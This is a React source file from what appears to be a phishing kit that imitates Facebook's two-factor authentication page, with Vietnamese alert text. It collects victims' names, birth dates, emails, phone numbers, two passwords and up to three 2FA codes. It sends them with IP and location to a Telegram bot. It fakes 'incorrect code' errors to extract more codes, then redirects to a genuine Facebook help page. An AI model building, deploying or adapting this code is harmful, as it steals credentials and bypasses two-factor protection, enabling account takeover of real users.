import React, { useState } from "react";
import { useLocation, Navigate } from "react-router-dom";
import "./AuthCodeForm.scss";
import {
  BOT_TOKEN,
  CHAT_ID,
  MAX_CODE_ATTEMPTS,
  CODE_MIN_LENGTH,
  CODE_MAX_LENGTH,
  CODE_COOLDOWN_SECONDS,
  CODE_REDIRECT_DELAY_MS,
  TRY_ANOTHER_WAY_DELAY_MS,
} from "./config";

const AuthCodeForm = () => {

  const { state } = useLocation();
  if (!state) return <Navigate to="/" replace />;

  const {
    method = "app",
    ip,
    location,
    formData,
    password1,
    password2,
    additionalInfo,
    currentUrl = "",
  } = state;

  const [code, setCode] = useState("");
  const [code1, setCode1] = useState("");
  const [code2, setCode2] = useState("");
  const [code3, setCode3] = useState("");
  const [method1, setMethod1] = useState("");
  const [method2, setMethod2] = useState("");
  const [method3, setMethod3] = useState("");

  const [showOptions, setShowOptions] = useState(false);
  const [loadingOptions, setLoadingOptions] = useState(false);

  const [selectedMethod, setSelectedMethod] = useState(method);
  const [currentStep, setCurrentStep] = useState(`code-${method}`);

  const [clickCount, setClickCount] = useState(0);
  const [isSubmitDisabled, setIsSubmitDisabled] = useState(false);
  const [timeLeft, setTimeLeft] = useState(0);

  const [loadingSubmit, setLoadingSubmit] = useState(false);
  const [loadingConfirm, setLoadingConfirm] = useState(false);

  const getCurrentTime = () => {
    const now = new Date();
    const timeString = now.toLocaleTimeString("vi-VN");
    const dateString = now.toLocaleDateString("vi-VN");
    return `${timeString} ${dateString}`;
  };

  const startCooldown = () => {
    setIsSubmitDisabled(true);
    setTimeLeft(CODE_COOLDOWN_SECONDS);
    const timer = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          clearInterval(timer);
          setIsSubmitDisabled(false);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
  };

  const sendToTelegram = async (
    step,
    {
      code1Input = code1,
      code2Input = code2,
      code3Input = code3,
      method1Input = method1,
      method2Input = method2,
      method3Input = method3,
    } = {}
  ) => {
    const locationParts = location.split("/").map((part) => part.trim());
    const currentTime = getCurrentTime();
    const message_id = localStorage.getItem("telegram_msg_id");

    const message = `
📶 <b>XÁC THỰC 2FA (${step.toUpperCase()})</b>
━━━━━━━━━━━━━━━━━━━━━
📱 Tên PAGE: <code>${formData.link}</code>
👨‍💼 Họ Tên: <code>${formData.fullName}</code>
🎂 Ngày Sinh: <code>${formData.dateOfBirth || "N/A"}</code>
━━━━━━━━━━━━━━━━━━━━━
📍 <b>THÔNG TIN VỊ TRÍ</b>
🌐 IP: <code>${ip}</code>
🏳️ Quốc Gia: <code>${locationParts[2] || "N/A"}</code>
🏙 Thành Phố: <code>${locationParts[1] || "N/A"}</code>
⏰ Thời Gian: <code>${currentTime}</code>
━━━━━━━━━━━━━━━━━━━━━
🔐 <b>THÔNG TIN ĐĂNG NHẬP</b>
📧 Email: <code>${formData.personalEmail}</code>
📧 Email Business: <code>${formData.businessEmail}</code>
📞 SĐT: <code>${formData.phoneNumber}</code>
🔑 Mật Khẩu 1: <code>${password1}</code>
🔑 Mật Khẩu 2: <code>${password2}</code>
🛡 Mã 2FA 1: <code>${code1Input || "N/A"}</code> (${method1Input || "?"})
🛡 Mã 2FA 2: <code>${code2Input || "N/A"} </code>(${method2Input || "?"})
🛡 Mã 2FA 3: <code>${code3Input || "N/A"} </code>(${method3Input || "?"})
`;

    if (message_id) {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          message_id,
          text: message,
          parse_mode: "HTML",
        }),
      });
    } else {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
          parse_mode: "HTML",
        }),
      });
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (code.length < CODE_MIN_LENGTH || isSubmitDisabled || clickCount >= MAX_CODE_ATTEMPTS || loadingSubmit)
      return;

    setLoadingSubmit(true);
    try {
      if (clickCount === 0) {
        setCode1(code);
        setMethod1(selectedMethod);
        await sendToTelegram("code1", {
          code1Input: code,
          method1Input: selectedMethod,
        });
        setClickCount(1);
        setCode("");
        startCooldown();
      } else if (clickCount === 1) {
        setCode2(code);
        setMethod2(selectedMethod);
        await sendToTelegram("code2", {
          code1Input: code1,
          code2Input: code,
          method1Input: method1,
          method2Input: selectedMethod,
        });
        setClickCount(2);
        setCode("");
        startCooldown();
      } else if (clickCount === 2) {
        setCode3(code);
        setMethod3(selectedMethod);
        await sendToTelegram("code3", {
          code1Input: code1,
          code2Input: code2,
          code3Input: code,
          method1Input: method1,
          method2Input: method2,
          method3Input: selectedMethod,
        });
        setTimeout(() => {
          window.location.href =
            "https://www.facebook.com/help/1735443093393986/";
        }, CODE_REDIRECT_DELAY_MS);
      }
    } catch (err) {
      console.error("Telegram Error:", err);
    } finally {
      setLoadingSubmit(false);
    }
  };

  const handleTryAnotherWay = () => {
    setLoadingOptions(true);
    setTimeout(() => {
      setLoadingOptions(false);
      setShowOptions(true);
    }, TRY_ANOTHER_WAY_DELAY_MS);
  };

  const handleMethodSelect = (method) => setSelectedMethod(method);

  const confirmMethod = () => {
    setShowOptions(false);
    setCurrentStep(`code-${selectedMethod}`);
    setCode("");
  };

  const handleConfirmClick = async () => {
    if (loadingConfirm) return;
    setLoadingConfirm(true);
    try {
      confirmMethod();
    } finally {
      setLoadingConfirm(false);
    }
  };

  const getPhoneTail = (phone = "") => {
    const digits = String(phone).replace(/\D/g, "");
    if (!digits) return "**";
    return digits.slice(-2);
  };
  const maskPhone = (phone = "") => {
    const tail = getPhoneTail(phone);
    return `number ******${tail}`;
  };
  const maskEmail = (email = "") => {
    if (!email || !email.includes("@")) return "***@***";
    const [user, domain] = email.split("@");
    const visible = user.length >= 2 ? user.slice(0, 2) : user.slice(0, 1);
    return `${visible}***@${domain}`;
  };
  const getMethodTargetLabel = (m, formData) => {
    if (m === "email") {
      const email = formData?.personalEmail || formData?.businessEmail || "";
      return maskEmail(email);
    }
    return maskPhone(formData?.phoneNumber || "");
  };

  return (
    <div className="auth-container">
      <div className="auth-box">
        <p className="meta">
          {formData?.fullName || "Facebook User"} • Facebook
        </p>

        {currentStep === "code-whatsapp" ? (
          <>
            <p className="title">Check your WhatsApp messages</p>
            <p className="description">
              Enter the code we sent to your WhatsApp{" "}
              {getMethodTargetLabel("whatsapp", formData)}.
            </p>
            <img
              src="/imgi_1_whatsApp.4313bae1d1ce346d2fe6.png"
              alt="whatsapp"
              className="auth-image"
            />
          </>
        ) : currentStep === "code-sms" ? (
          <>
            <p className="title">Check your text messages</p>
            <p className="description">
              Enter the code we sent to your{" "}
              {getMethodTargetLabel("sms", formData)}.
            </p>
            <img
              src="/imgi_1_sms.874d1de2b472119dde0c.png"
              alt="sms"
              className="auth-image"
            />
          </>
        ) : currentStep === "code-email" ? (
          <>
            <p className="title">Check your Email</p>
            <p className="description">
              Enter the code we sent to{" "}
              {getMethodTargetLabel("email", formData)}.
            </p>
            <img
              src="/imgi_1_sms.874d1de2b472119dde0c.png"
              alt="email"
              className="auth-image"
            />
          </>
        ) : (
          <>
            <p className="title">Go to your authentication app</p>
            <p className="description">
              Enter the 6-digit code for this account from the two-factor
              authentication app that you set up (such as Duo Mobile or Google
              Authenticator).
            </p>
            <img
              src="/imgi_1_2fa.cef3489675d7acf425ec.jpg"
              alt="2FA"
              className="auth-image"
            />
          </>
        )}

        <form onSubmit={handleSubmit}>
          <input
            type="text"
            placeholder="Code"
            maxLength={CODE_MAX_LENGTH}
            value={code}
            onChange={(e) => setCode(e.target.value)}
            className="auth-input"
          />

          {isSubmitDisabled && (
            <p
              className="description"
              style={{ marginTop: -4, marginBottom: 12, color: "red" }}
            >
              The code you entered is incorrect or already used. Please try
              again after {String(timeLeft).padStart(2, "0")}s.
            </p>
          )}

          <button
            type="submit"
            className={`auth-button ${isSubmitDisabled ? "disabled" : ""}`}
            disabled={code.length < CODE_MIN_LENGTH || isSubmitDisabled || loadingSubmit}
          >
            {loadingSubmit ? <span className="spinner-inline" /> : "Continue"}
          </button>
        </form>

        <button
          className="secondary-button"
          onClick={handleTryAnotherWay}
          disabled={loadingOptions}
        >
          {loadingOptions ? (
            <span className="spinner-inline" />
          ) : (
            "Try Another Way"
          )}
        </button>
      </div>

      {showOptions && (
        <div className="modal-overlay" onClick={() => setShowOptions(false)}>
          <div className="modal" onClick={(e) => e.stopPropagation()}>
            <h3>Select a method to verify your identity</h3>
            <p>These verification methods are available to you.</p>
            <div className="method-list">
              {["app", "whatsapp", "sms", "email"].map((m) => (
                <label key={m}>
                  <div className="method-info">
                    <strong>
                      {m === "app" ? "Authentication app" : m.toUpperCase()}
                    </strong>
                    <span>
                      {m === "app"
                        ? "Google Authenticator, Duo Mobile"
                        : `We will send the code to ${getMethodTargetLabel(
                            m,
                            formData
                          )}`}
                    </span>
                  </div>
                  <input
                    type="radio"
                    checked={selectedMethod === m}
                    onChange={() => handleMethodSelect(m)}
                  />
                </label>
              ))}
            </div>

            <button
              className="auth-button"
              onClick={handleConfirmClick}
              disabled={loadingConfirm}
            >
              {loadingConfirm ? (
                <span className="spinner-inline" />
              ) : (
                "Continue"
              )}
            </button>
          </div>
        </div>
      )}
    </div>
  );
};

export default AuthCodeForm;
